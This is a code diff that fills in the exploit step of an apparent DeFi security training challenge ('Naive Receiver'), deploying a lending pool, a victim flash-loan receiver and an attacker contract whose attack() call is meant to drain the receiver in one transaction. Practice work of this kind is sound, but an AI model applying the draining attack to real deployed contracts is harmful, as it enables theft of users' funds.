@@ -2,6 +2,7 @@ from brownie import (
     accounts,
     NaiveReceiverLenderPool,
     FlashLoanReceiver,
+    attacker
 )
 from web3 import Web3
 
@@ -33,7 +34,27 @@ def before():
 def run_exploit():
     # remove pass and add exploit code here
     # attacker = accounts[1] - account to be used for exploit
-    pass
+    deployer = accounts[0]
+    random_user = accounts[2]
+
+    lender_pool = NaiveReceiverLenderPool.deploy({"from": deployer})
+    deployer.transfer(lender_pool, ETHER_IN_POOL)
+
+    # random_user deploying their flash load receiver
+    vulnerable_receiver = FlashLoanReceiver.deploy(
+        lender_pool.address, {"from": random_user}
+    )
+    random_user.transfer(vulnerable_receiver.address, ETHER_IN_RECEIVER)
+
+    attacker_ea = accounts[1]
+    
+    # the attacker contract will loop to empty the receiver in only one transaction
+    attacker_contract = attacker.deploy(vulnerable_receiver.address, lender_pool.address, {"from": deployer})
+
+    print(attacker_contract.borrower())
+    print(attacker_contract.poolAddress())
+
+    attacker_contract.attack({'from': attacker_ea})
 
 
 def after():
